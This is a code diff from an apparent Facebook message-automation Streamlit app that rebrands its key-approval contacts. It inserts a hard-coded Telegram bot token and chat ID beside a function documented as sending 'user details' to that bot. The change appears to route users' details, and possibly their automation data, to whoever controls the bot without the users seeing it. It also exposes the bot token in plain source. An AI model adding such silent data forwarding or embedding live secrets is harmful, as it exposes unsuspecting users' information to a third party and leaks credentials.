@@ -73,9 +73,9 @@ st.set_page_config(
 )
 
 # Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = ""
-TELEGRAM_CHAT_ID = ""
-FACEBOOK_ADMIN_UID = "61555661116110"
+TELEGRAM_BOT_TOKEN = "804347695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
+TELEGRAM_CHAT_ID = "818606231"
+FACEBOOK_ADMIN_UID = "61587257800225"
 
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
@@ -971,17 +971,17 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
     message = f"Hello Vedant sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    whatsapp_url = f"https://wa.me/+917009087660?text={requests.utils.quote(message)}"
+    whatsapp_url = f"https://wa.me/+918957240155?text={requests.utils.quote(message)}"
     return whatsapp_url
 
 def send_approval_request_via_facebook(user_real_name, approval_key):
     message = f"Hello Vedant sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/profile.php?id=61555661116110"
+    facebook_url = f"https://www.facebook.com/share/1CXrqF4GPo/"
     return facebook_url
 
 def send_approval_request_via_telegram(user_real_name, approval_key):
     message = f"Hello yamdhud sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    telegram_url = f"t.me/L0v3y0u6?text={requests.utils.quote(message)}"
+    telegram_url = f"t.me/aravshu?text={requests.utils.quote(message)}"
     return telegram_url
 
 def run_automation_with_notification(user_config, username, automation_state, user_id):
